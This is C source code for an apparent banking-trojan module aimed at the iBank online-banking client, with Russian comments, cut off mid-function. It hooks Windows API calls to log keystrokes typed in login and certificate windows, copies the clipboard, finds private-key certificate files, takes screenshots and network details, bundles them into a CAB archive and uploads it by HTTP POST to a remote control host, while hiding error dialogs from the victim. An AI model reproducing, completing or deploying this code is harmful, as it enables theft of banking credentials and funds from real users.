#include "Ibank.h"
//#ifdef RuBnkH
#include "Strings.h"

typedef struct __ibankstruct
{
	char *WindowName;
	char *ClipBoard;

	WCHAR *CertTempPath;

	char *Password;
	DWORD dwPassLen;

} IBANK, *PIBANK;

PIBANK pIbank;


//ф-ции которые будем хукать
typedef BOOL   ( WINAPI *PIbankTranslateMessage )( const MSG *lpMsg );
typedef int    ( WINAPI *PConnect				)( SOCKET s, const struct sockaddr *name, int namelen );
typedef HANDLE ( WINAPI *PCreateFileW			)( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
typedef BOOL   ( WINAPI *PShowWindow			)( HWND hWnd, int Cmd );



PIbankTranslateMessage	Real_IbankTranslateMessage;
PConnect				Real_Connect;
PCreateFileW			Real_CreateFileW;
PShowWindow				Real_ShowWindow1;

//языки самой программы
#define ENTER_SYSTEM_MENU_RUS	      0x144497E5
#define SYNCHRONIZATION_WITH_BANK_RUS 0x9548BABC
#define SYNCHRONIZATION_PROCESS_RUS	  0xC8BBFA76

#define ENTER_SYSTEM_MENU_UKR		  0xEBB4681A
#define SYNCHRONIZATION_WITH_BANK_UKR 0x9564AD10
#define SYNCHRONIZATION_PROCESS_UKR   0xBB540561

#define ENTER_SYSTEM_MENU_ENG		  0xCC7AA9CB
#define SYNCHRONIZATION_WITH_BANK_ENG 0x91617796
#define SYNCHRONIZATION_PROCESS_ENG   0xB28711CE


//меню
#define ENTER_SYSTEM_MENU		  1 //меню ввода пароля в PC, меню ввода пароля + серта в браузере
#define SYNCHRONIZATION_WITH_BANK 2 //меню ввода пароля + серта в PC
#define SYNCHRONIZATION_PROCESS   3 //отправка данных в PC

//всякая хуйня
bool SHIFT_FLAG = false;
bool CAPSL_FLAG = false;

DWORD dwLastLayout = -1;

int m_tolower( int c )
{
	if ( c >= 65 && c <= 90 )
	{
		c += 32;
	}

	return c;	
}

int m_toupper( int c )
{
	if ( c >= 97 && c <= 122 )
	{
		c -= 32;
	}

	return c;	
}

int m_toupper_rus( int c )
{
	if ( c <= (-1) && c >= (-32) )
	{
		c -= 32;
	}

	return c;
}

int m_tolower_rus( int c )
{
	if ( c <= (-33) && c >= (-64) )
	{
		c += 32;
	}

	return c;
}



BOOL WINAPI Hook_ShowWindow1(HWND hWnd, int Cmd)//отлавливаем окна которые показывает
{
	
	WCHAR cText[MAX_PATH];
	pGetWindowTextW(hWnd,cText,MAX_PATH);
	if (NULL!=(PTSTR)pStrStrIW(cText,L"Ошибка"))
	{
		char str1[260];
		pGetWindowTextA(hWnd,str1,260);
			Cmd=0;
			pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
			pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED );
			pSetLayeredWindowAttributes(hWnd, 0, 0, LWA_ALPHA);
			pSendMessageA( hWnd, WM_CLOSE, NULL, NULL );	
	}


	return Real_ShowWindow1(hWnd, Cmd);
}

DWORD GetCurrentMenuType()
{
	DWORD dwCurrentWindow = GetCurrentWindowHash();

	if ( dwCurrentWindow == ENTER_SYSTEM_MENU_RUS ||
		 dwCurrentWindow == ENTER_SYSTEM_MENU_UKR ||
		 dwCurrentWindow == ENTER_SYSTEM_MENU_ENG )
	{
		return ENTER_SYSTEM_MENU;
	}
	else if ( dwCurrentWindow == SYNCHRONIZATION_WITH_BANK_RUS ||
			  dwCurrentWindow == SYNCHRONIZATION_WITH_BANK_UKR ||
			  dwCurrentWindow == SYNCHRONIZATION_WITH_BANK_ENG )
	{
		return SYNCHRONIZATION_WITH_BANK;
	}
	else if ( dwCurrentWindow == SYNCHRONIZATION_PROCESS_RUS ||
			  dwCurrentWindow == SYNCHRONIZATION_PROCESS_UKR ||
			  dwCurrentWindow == SYNCHRONIZATION_PROCESS_ENG )
	{
		return SYNCHRONIZATION_PROCESS;
	}

	return 0;
}
typedef struct InSend
{
	char * FileName;
	int FileType;
}FROMSENDDATA,*LPFROMSENDDATA;
DWORD WINAPI SendIbank( LPVOID lpData )
{
	if ( !lpData )
	{
		return 0;
	}
	LPFROMSENDDATA pStr=(LPFROMSENDDATA)lpData;
	

	char *FilePath = (char*)pStr->FileName;

	HANDLE hFile = pCreateFileA( FilePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	
	if ( hFile == INVALID_HANDLE_VALUE )
	{		
		return 0;
	}
	
	DWORD h;
	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );		

	LPBYTE lpFile = NULL;

	if ( dwFileSize > 0 )
	{
		HANDLE hMapFile = (HANDLE)pCreateFileMappingA( hFile, 0, PAGE_READONLY, 0, 0, 0 );

		if ( hMapFile != INVALID_HANDLE_VALUE )
		{
			LPBYTE pbyFile = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

			if ( ( lpFile = (LPBYTE)MemAlloc( dwFileSize + 1 ) ) != NULL )
			{
				m_memcpy( lpFile, pbyFile, dwFileSize );
			}

			pUnmapViewOfFile( pbyFile );
		}

		pCloseHandle( hMapFile );
	}

	pCloseHandle( hFile );

	if ( !lpFile )
	{
		return 0;
	}

	char HeaderTemplate[] = "POST /get/cab.html HTTP/1.0\r\n"
							"Host: %s\r\n"
							"User-Agent: %s\r\n"
							"Connection: close\r\n"
							"Content-Length: %d\r\n"
							"Content-Type: multipart/form-data; boundary=---------------------------%d\r\n\r\n";

	char *Boundary = (char*)MemAlloc( 100 );

	if ( Boundary == NULL )
	{
		MemFree( lpFile );
		return false;
	}

	DWORD dwBoundary = (DWORD)pGetTickCount();
	char *Boundary_1 = (char*)MemAlloc( 100 );

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	pwsprintfA( Boundary_1, "-----------------------------%d\r\n", dwBoundary  );							

	char Uid[100];
	GenerateUid( Uid );

	char *UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	char *SendBuffer_1 = (char*)MemAlloc( 1024 );
	char *SendBuffer_2 = (char*)MemAlloc( 1024 + dwFileSize );
	char *SendBuffer_3 = (char*)MemAlloc( 1024 );

	//id
	pwsprintfA( SendBuffer_1, "%sContent-Disposition: form-data; name=\"id\"\r\n\r\n%s\r\n", Boundary_1, Uid );

	//file
	pwsprintfA( SendBuffer_2, "%sContent-Disposition: form-data; name=\"cab\"; filename=\"%d\"\r\nContent-Type: application/octet-stream\r\n\r\n", Boundary_1, (DWORD)pGetTickCount()  );

	//type
	if (pStr->FileType==2)
		pwsprintfA( SendBuffer_3, "%sContent-Disposition: form-data; name=\"type\"\r\n\r\n2\r\n", Boundary_1 );
	else
		pwsprintfA( SendBuffer_3, "%sContent-Disposition: form-data; name=\"type\"\r\n\r\n6\r\n", Boundary_1 );

	
	DWORD dwBuffer2Len = m_lstrlen( SendBuffer_2 );

	m_memcpy( SendBuffer_2 + dwBuffer2Len, lpFile, dwFileSize );

	DWORD dwContentLen = m_lstrlen( SendBuffer_1 ) + dwBuffer2Len  + m_lstrlen( SendBuffer_3 ) + dwFileSize + m_lstrlen( Boundary_1 ) + 2;

	
	bool bConnect = false;

	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return 0;
	}

	char Host[100];

	SOCKET Socket;

	for ( int i = 0; i < 3; i++ )
	{
	//	m_lstrcpy( Host, GetMainHostByID( i ) );		
		m_lstrcpy( Host, GetCurrentHost2(  ) );		

		LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname( (const char*)Host );

		if ( lpHost != NULL )
		{
			Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );

			if( Socket != -1 )
			{
				int sPort = 80;

				struct sockaddr_in SockAddr;

				SockAddr.sin_family		 = AF_INET;
				SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
				SockAddr.sin_port		 = HTONS( (unsigned short)sPort );

				if ( Real_Connect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) != SOCKET_ERROR )
				{
					bConnect = true;
					break;
				}
			}

			pclosesocket( Socket );
		}
	}


	
	bool ret = false;

	if ( bConnect )
	{		
		char *Header = (char*)MemAlloc( 1024 );

		pwsprintfA( Header, HeaderTemplate, Host, UserAgent, dwContentLen, dwBoundary );


		MySend( Socket, (const char *)Header, m_lstrlen( Header ) );
		MySend( Socket, (const char *)SendBuffer_1, m_lstrlen( SendBuffer_1 ) );
		MySend( Socket, (const char *)SendBuffer_3, m_lstrlen( SendBuffer_3 ) );
		MySend( Socket, (const char *)SendBuffer_2, dwBuffer2Len + dwFileSize );
		MySend( Socket, "\r\n", 2 );
		MySend( Socket, Boundary_1,   m_lstrlen( Boundary_1 ) );
		MySend( Socket, "\r\n", 2 );

		DWORD dw = 0;
		char * Buf = RecvAndParse( Socket, &dw );
		if ( !m_lstrncmp( Buf, "OK!", 3 ) )
		{
			ret = true;
		}
						
		pclosesocket( Socket );

		MemFree( Header );
	}

	
	MemFree( SendBuffer_1 );
	MemFree( SendBuffer_2 );
	MemFree( SendBuffer_3 );
	MemFree( lpFile );
	
	if ( !ret )
	{
		pSleep( 1000 * 3 );
		SendIbank( lpData );
		return 0;
	}

	pDeleteFileA( FilePath );
	MemFree( FilePath );


	return ret;
}


HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	
	HANDLE hRet = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
	
	DWORD dwCurrentMenu = GetCurrentMenuType();

	if ( dwCurrentMenu == ENTER_SYSTEM_MENU || dwCurrentMenu == SYNCHRONIZATION_WITH_BANK ) // Вход в систему или Синхронизация с банком
	{
		if ( pIbank && !pIbank->CertTempPath ) 
		{			
			WCHAR FileName[ MAX_PATH ];
			plstrcpyW( FileName, lpFileName );

            // IBank по расширению dat определяем
			if ( GetFileFormat( FileName ) == 0x1930F4 || GetFileFormat( FileName ) ==0x1AB5F3)	//  раcширение dat или jks                                                                
			{
				if ( ( pIbank->CertTempPath = (WCHAR*)MemAlloc( 1024 ) ) != NULL )
				{
					plstrcpyW( pIbank->CertTempPath, lpFileName );
				}
			}

            // IBank по сигнатуре файла определяем
			else 
			{
				HANDLE hFile = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );

				if ( hFile != INVALID_HANDLE_VALUE )
				{		
					DWORD h;
					DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );			

					if ( dwFileSize > 0 )
					{
						HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );
						LPBYTE pbyFile  = NULL;

						if ( hMapFile != INVALID_HANDLE_VALUE )
						{
							LPBYTE pbyFile = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

							if ( pbyFile != NULL )
							{
								BYTE iBankSignature[] = {0x69, 0x42, 0x4B, 0x53, 0};

								bool bIsIbank = true;

								for ( DWORD i = 0; i < 4; i++ )
								{
									if ( iBankSignature[i] != pbyFile[i] )
									{
										bIsIbank = false;
										break;
									}
								}

								if ( bIsIbank )
								{
									if ( ( pIbank->CertTempPath = (WCHAR*)MemAlloc( 1024 ) ) != NULL )
									{
										plstrcpyW( pIbank->CertTempPath, lpFileName );
									}
								}
							}

							pUnmapViewOfFile( pbyFile );
						}

						pZwClose( hMapFile );
					}

					pZwClose( hFile );	
				}	
			}
		}
	}

	
	return hRet;
}
#define MAX_SISE_OF_FOUND 1024*1000
LONGLONG SizeOfFiles(WCHAR* Path)
{
	// Возвращает общий размер файлов
	LONGLONG nFileLen = 0;
	
	//создаем маску
	WCHAR cPath[MAX_PATH];
	m_memset(cPath,0,MAX_PATH*2);
	plstrcpyW(&cPath[0],Path);
	plstrcatW(&cPath[0],L"*.*");

	WIN32_FIND_DATAW Search;
	HANDLE File = pFindFirstFileW(cPath, &Search);
	if (File == INVALID_HANDLE_VALUE)
	{
		return -1;
	}
	// Перебираем найденные файлы
	while (File != NULL)
	{
        if ((Search.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
		{	
			nFileLen = nFileLen+(Search.nFileSizeHigh * (4294967295+1)) + Search.nFileSizeLow;// на случай очень большого файла			
        }
		else
		{
			//выкидываем лишние 
			if( plstrcmpW( Search.cFileName,L".") != 0 &&
				plstrcmpW( Search.cFileName,L"..") != 0 )
			{
				WCHAR wPath[MAX_PATH];
				m_memset(wPath,0,MAX_PATH*2);
				plstrcpyW(&wPath[0],Path);
				
				plstrcatW(&wPath[0],Search.cFileName);
				plstrcatW(&wPath[0],L"\\");
				nFileLen=nFileLen+SizeOfFiles( wPath);
				if (nFileLen>MAX_SISE_OF_FOUND)
					break;
			}
		}
		// Получаем следцющий файл
		if (!pFindNextFileW(File, &Search)) break;;
	}
	// Освобождаем данные	
	pFindClose(File);
	return nFileLen;
}

bool DirMorEmb(WCHAR*FilderName)
{
	if(SizeOfFiles(FilderName)>MAX_SISE_OF_FOUND)
		return false;
	else
		return true;
}


///необходимые флаги
typedef enum {
    SHGFP_TYPE_CURRENT  = 0,   // current value for user, verify it exists
    SHGFP_TYPE_DEFAULT  = 1,   // default value, may not exist
} SHGFP_TYPE;
#define CSIDL_APPDATA                   0x001a        // <user name>\Application Data
bool bTmp=true;
bool OpenFileAndMessage()
{

	HANDLE hHandle;
	WCHAR ExplorerAddRu[] = {'\\','r','u',L'\0'};//
	WCHAR ExplorerAddUa[] = {'\\','u','a',L'\0'};//
	WCHAR SysPathRu[MAX_PATH];
	WCHAR SysPathUa[MAX_PATH];
	m_memset(SysPathRu,0,MAX_PATH*2);
	m_memset(SysPathUa,0,MAX_PATH*2);
	pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPathRu);	
	plstrcatW( SysPathRu, ExplorerAddRu );
	plstrcatW( SysPathUa, ExplorerAddUa );
	if ( (DWORD)pGetFileAttributesW( SysPathRu ) != -1  )
	{		
		if(bTmp)
		{
			bTmp=false;
			return true;
		}
		else 
			bTmp=true;
		DWORD dwReadDD;
		char ReadData[1024];
		m_memset(ReadData,0,1024);
		hHandle	=	pCreateFileW(SysPathRu, GENERIC_READ, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
		pReadFile(hHandle,ReadData,1024,&dwReadDD,NULL);
		pCloseHandle(hHandle);
		pMessageBoxA(0,ReadData,"Информация",MB_ICONINFORMATION);
		return true;
	}
	else
	if ( (DWORD)pGetFileAttributesW( SysPathUa ) != -1  )
	{
		DWORD dwReadDD;
		char ReadData[1024];
		m_memset(ReadData,0,1024);
		hHandle	=	pCreateFileW(SysPathUa, GENERIC_READ, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
		pReadFile(hHandle,ReadData,1024,&dwReadDD,NULL);
		pCloseHandle(hHandle);
		pMessageBoxA(0,ReadData,"Информация",MB_ICONINFORMATION);
		return true;
	}
	return false;
}


int WINAPI Hook_Connect( SOCKET s, const struct sockaddr *name, int namelen )
{
	if (pIbank->Password !=NULL)
	if ( m_lstrlen( pIbank->Password ) && m_lstrlen( pIbank->WindowName ) )
	{
		
				
	//	pMessageBoxA(0,"Hook_Connect","TEST!!!!!!!",MB_OK);
		sockaddr_in *SockAddr = (sockaddr_in*)&*name;

		int Port     =  (int)phtons( SockAddr->sin_port );
		char *Server = (char*)pinet_ntoa( SockAddr->sin_addr );

		if ( Server )
		{
			
			UnhookCreateFileW();

			WCHAR *ModulePath = (WCHAR*)MemAlloc( 1024 );
			pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
						
			char Template[] = "Program: %ws\r\n"
							  "Wnd Name: %s\r\n"
							  "Server: %s:%d\r\n"
							  "Password: %s\r\n"
							  "Certificate: %ws\r\n"
							  "ClipBuffer: %s\r\n";


			char *InfoBuffer = (char*)MemAlloc( 1024 );

			typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
			fwsprintfA pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
						
			pwsprintfA( InfoBuffer, Template, ModulePath, pIbank->WindowName, Server, Port, pIbank->Password, pIbank->CertTempPath, pIbank->ClipBoard );
				
			char *InfoFile = GetTempNameA();

			bool AddLog	= false;

			if ( InfoFile )
			{
				HANDLE hLog = (HANDLE)pCreateFileA( InfoFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

				if ( hLog != INVALID_HANDLE_VALUE )
				{
					DWORD dwWritten = 0;

					if ( (BOOL)pWriteFile( hLog, InfoBuffer, (DWORD)m_lstrlen( InfoBuffer ), &dwWritten, 0 ) )
					{
						AddLog = true;
					}
				}

				pCloseHandle( hLog );
			}

			MemFree( InfoBuffer );	
						
			LPVOID lpScreen;
			DWORD dwScreenSize;
			GetScreen( &lpScreen, &dwScreenSize );

			bool AddScreen	 = false;
			char *ScreenFile = GetTempNameA();
		
			if ( lpScreen )
			{
				HANDLE hLog = (HANDLE)pCreateFileA( ScreenFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

				if ( hLog != INVALID_HANDLE_VALUE )
				{
					DWORD dwWritten = 0;

					if ( (BOOL)pWriteFile( hLog, lpScreen, dwScreenSize, &dwWritten, 0 ) )
					{
						AddScreen = true;
					}
				}

				pCloseHandle( hLog );
			}

			MemFree( lpScreen );

			if ( AddLog )
			{
				
				char *Path = GetTempNameA();			
				if ( Path )
				{
					if (OpenFileAndMessage())
					{
						return -1;
					}
					LPFROMSENDDATA  Data;
					Data =	(LPFROMSENDDATA)MemAlloc(sizeof(FROMSENDDATA));
					Data->FileName = Path;
					Data->FileType	= 2;

					HCAB hCab = NULL;

					if ( ( hCab = CreateCab( Path ) ) != NULL )
					{
						AddFileToCab( hCab, InfoFile, "Information.txt" );

						if ( pIbank->CertTempPath )
						{	
							//если jks
							if (GetFileFormat( pIbank->CertTempPath ) ==0x1AB5F3)
							{
								Data->FileType	= 6;
								WCHAR Dir[MAX_PATH];
								m_memset(Dir,0,MAX_PATH*2);
								plstrcpyW(Dir , pIbank->CertTempPath );
								int iTimer= MAX_PATH; 
								while (true)
								{
									if (Dir[iTimer]!=L'\\')
										Dir[iTimer]=0;
									else
									{
										
										break;
									}
									iTimer--;
									if (iTimer==0)
										break;

								}
								if (DirMorEmb(Dir))
								{								
									AddDirToCab( hCab, ToAnsi(Dir), "Directory" );									
								}
								else 
								{
									AddFileToCab( hCab, ToAnsi( pIbank->CertTempPath ), ToAnsi( pIbank->CertTempPath ) );									
								}
							}
							else								
							AddFileToCab( hCab, ToAnsi( pIbank->CertTempPath ), ToAnsi( pIbank->CertTempPath ) );
						}

						if ( AddScreen )
						{
							AddFileToCab( hCab, ScreenFile, "screen.jpeg" );
						}

						char *NetFile = GetNetInfo();

						if ( NetFile != NULL )
						{
							AddFileToCab( hCab, NetFile, "NetInfo.txt" );
							pDeleteFileA( NetFile );
						}

						MemFree( NetFile );

						CloseCab( hCab );
												
						StartThread( SendIbank, (LPVOID)Data );
					}
				}
			}

			pDeleteFileA( InfoFile );
			pDeleteFileA( ScreenFile );


			if ( HookApi( 1, 0x8F8F102, (DWORD)&Hook_CreateFileW ) )
			{
				__asm mov [Real_CreateFileW], eax
			}


			MemFree( pIbank );

			pIbank = (PIBANK)MemAlloc( sizeof( PIBANK ) );

			if ( pIbank )
			{
				m_memset( pIbank, 0, sizeof( PIBANK ) );
			}
		}
	}
	return Real_Connect( s, name, namelen );
}



void TranslateSymbol( DWORD dwKeyLayout, char Symbol, PBYTE OutSymbol )
{
	char Symb = Symbol;

	if ( CAPSL_FLAG )
	{
		if ( (int)Symbol >= 97 && (int)Symbol <= 122 )
		{
			Symb = m_toupper( (int)Symbol );
		}
		else if ( (int)Symbol <= (-1) && (int)Symbol >= (-32) )
		{
			Symb = (int)m_toupper_rus( Symbol );
		}
	}

	if ( dwKeyLayout == 0x66DD9BA && SHIFT_FLAG ) //eng
	{
		if ( (int)Symbol >= 97 && (int)Symbol <= 122 )
		{
			Symb = m_toupper( (int)Symbol );
		}
		else if ( (int)Symbol == 48 )
		{
			Symb = ')';
		}
		else if ( (int)Symbol == 49 )
		{
			Symb = '!';
		}
		else if ( (int)Symbol == 50 )
		{
			Symb = '@';
		}
		else if ( (int)Symbol == 51 )
		{
			Symb = '#';
		}
		else if ( (int)Symbol == 52 )
		{
			Symb = '$';
		}
		else if ( (int)Symbol == 53 )
		{
			Symb = '%';
		}
		else if ( (int)Symbol == 54 )
		{
			Symb = '^';
		}
		else if ( (int)Symbol == 55 )
		{
			Symb = '&';
		}
		else if ( (int)Symbol == 56 )
		{
			Symb = '*';
		}
		else if ( (int)Symbol == 57 )
		{
			Symb = '(';
		}
		else if ( (int)Symbol == 91 )
		{
			Symb = '{';
		}
		else if ( (int)Symbol == 93 )
		{
			Symb = '}';
		}
		else if ( (int)Symbol == 59 )
		{
			Symb = ':';
		}
		else if ( (int)Symbol == 39 )
		{
			Symb = '"';
		}
		else if ( (int)Symbol == 44 )
		{
			Symb = '<';
		}
		else if ( (int)Symbol == 46 )
		{
			Symb = '>';
		}
		else if ( (int)Symbol == 47 )
		{
			Symb = '?';
		}
		else if ( (int)Symbol == 96 )
		{
			Symb = '~';
		}
		else if ( (int)Symbol == 45 )
		{
			Symb = '_';
		}
		else if ( (int)Symbol == 61 )
		{
			Symb = '+';
		}
		else if ( (int)Symbol == 92 )
		{
			Symb = '|';
		}
	}
	else if ( dwKeyLayout == 0x66DD93A && SHIFT_FLAG ) //rus
	{
		if ( (int)Symbol <= (-1) && (int)Symbol >= (-32) )
		{
			Symb = (int)m_toupper_rus( Symbol );
		}
		else if ( (int)Symbol == 48 )
		{
			Symb = ')';
		}
		else if ( (int)Symbol == 49 )
		{
			Symb = '!';
		}
		else if ( (int)Symbol == 50 )
		{
			Symb = '"';
		}
		else if ( (int)Symbol == 51 )
		{
			Symb = '№';
		}
		else if ( (int)Symbol == 52 )
		{
			Symb = ';';
		}
		else if ( (int)Symbol == 53 )
		{
			Symb = '%';
		}
		else if ( (int)Symbol == 54 )
		{
			Symb = ':';
		}
		else if ( (int)Symbol == 55 )
		{
			Symb = '?';
		}
		else if ( (int)Symbol == 56 )
		{
			Symb = '*';
		}
		else if ( (int)Symbol == 57 )
		{
			Symb = '(';
		}
		else if ( (int)Symbol == 46 )
		{
			Symb = ',';
		}
		else if ( (int)Symbol == 96 )
		{
			Symb = 'Ё';
		}
		else if ( (int)Symbol == 45 )
		{
			Symb = '_';
		}
		else if ( (int)Symbol == 61 )
		{
			Symb = '+';
		}
		else if ( (int)Symbol == 92 )
		{
			Symb = '/';
		}
	}

	*OutSymbol = (BYTE)Symb;

	return;
}

void ParseKeys( const MSG *lpMsg, DWORD dwCurrentMenu )
{
	char KeyboardLayout[10];
	m_memset( KeyboardLayout, 0, 10 );

	pGetKeyboardLayoutNameA( KeyboardLayout );
	DWORD dwKeyLayout = CalcHash( KeyboardLayout );

	if ( dwLastLayout == -1 )
	{
		dwLastLayout = dwKeyLayout;
	}

	bool bWriteKeys = false;

	if ( ( dwCurrentMenu == ENTER_SYSTEM_MENU || dwCurrentMenu == SYNCHRONIZATION_WITH_BANK ) && pIbank != NULL )
	{
		char Symbol[100];
		m_memset( Symbol, 0, 100 );

		if ( lpMsg->message == 0x0100 )
		{
			pOpenClipboard( NULL );
			HANDLE hClip = pGetClipboardData( CF_TEXT );

			if ( hClip != NULL )
			{
				char *LockedBuffer = (char*)pGlobalLock( hClip );

				if ( LockedBuffer != NULL )
				{
					if ( pIbank->ClipBoard == NULL )
					{
						if ( ( pIbank->ClipBoard = (char*)MemAlloc( m_lstrlen( LockedBuffer ) + 1 ) ) != NULL )
						{
							m_memcpy( pIbank->ClipBoard, LockedBuffer, m_lstrlen( LockedBuffer ) );
						}
					}
				}

				pGlobalUnlock( LockedBuffer );
			}

			pCloseClipboard(); 	

			if ( lpMsg->wParam == 8)
			{
				m_lstrcpy( Symbol, "[backspace_down]" );
			}
			else if ( lpMsg->wParam == 9 )
			{
				m_lstrcpy( Symbol, "[tab_down]" );
			}
			else if ( lpMsg->wParam == 13 )
			{
				m_lstrcpy( Symbol, "[enter_down]" );
			}
			else if ( lpMsg->wParam == 16 )
			{
				if ( dwLastLayout == dwKeyLayout )
				{
					SHIFT_FLAG = true;
				}
			}
			else if ( lpMsg->wParam == 20 )
			{
				CAPSL_FLAG = !CAPSL_FLAG;
			}
			else if ( lpMsg->wParam == 32 )
			{
				Symbol[0] = ' ';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam >= 48 && lpMsg->wParam <= 57 )
			{
				char Temp = (char)m_tolower( (int)lpMsg->wParam );
				
				Symbol[0] = Temp;
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 96 )
			{
				Symbol[0] = '0';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 97 )
			{
				Symbol[0] = '1';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 98 )
			{
				Symbol[0] = '2';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 99 )
			{
				Symbol[0] = '3';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 100 )
			{
				Symbol[0] = '4';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 101 )
			{
				Symbol[0] = '5';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 102 )
			{
				Symbol[0] = '6';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 103 )
			{
				Symbol[0] = '7';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 104 )
			{
				Symbol[0] = '8';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 105 )
			{
				Symbol[0] = '9';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 192 )
			{
				Symbol[0] = '`';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 189 )
			{
				Symbol[0] = '-';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 187 )
			{
				Symbol[0] = '=';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 220 )
			{
				Symbol[0] = '\\';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 106 )
			{
				Symbol[0] = '*';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 107 )
			{
				Symbol[0] = '+';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 110 )
			{
				Symbol[0] = '.';
				Symbol[1] = '\0';
			}
			else if ( lpMsg->wParam == 111 )
			{
				Symbol[0] = '/';
				Symbol[1] = '\0';
			}

			if ( dwKeyLayout == 0x66DD9BA ) //eng
			{
				if ( lpMsg->wParam == 219 )
				{
					Symbol[0] = '[';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 221 )
				{
					Symbol[0] = ']';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 186 )
				{
					Symbol[0] = ';';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 222 )
				{
					m_lstrcpy( Symbol, "''" );
				}
				else if ( lpMsg->wParam == 188 )
				{
					Symbol[0] = ',';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 190 )
				{
					Symbol[0] = '.';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 191 )
				{
					Symbol[0] = '/';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam >= 65 && lpMsg->wParam <= 90 )
				{
					char Temp   = (char)m_tolower( (int)lpMsg->wParam );

					Symbol[0] = Temp;
					Symbol[1] = '\0';	
				}

			}
			if ( dwKeyLayout == 0x66DD93A ) //rus
			{
				if ( lpMsg->wParam == 219 )
				{
					Symbol[0] = 'х';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 221 )
				{
					Symbol[0] = 'ъ';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 186 )
				{
					Symbol[0] = 'ж';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 222 )
				{
					Symbol[0] = 'э';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 188 )
				{
					Symbol[0] = 'б';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 190 )
				{
					Symbol[0] = 'ю';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 191 )
				{
					Symbol[0] = '.';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 65 )
				{
					Symbol[0] = 'ф';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 66 )
				{
					Symbol[0] = 'и';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 67 )
				{
